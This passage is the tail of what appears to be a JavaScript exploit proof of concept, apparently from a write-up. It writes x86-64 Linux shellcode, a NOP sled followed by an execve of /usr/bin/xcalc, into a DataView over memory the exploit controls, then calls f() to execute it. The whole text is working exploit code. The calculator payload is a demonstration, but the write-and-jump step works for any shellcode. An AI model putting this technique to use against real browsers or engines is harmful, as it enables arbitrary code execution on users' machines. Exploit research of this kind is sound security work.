var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

for(var i = 0; i < shellcode.length;i++){
	var value = shellcode[i];		
	data_view.setUint32(i * 4, value,true);
}

f();
```

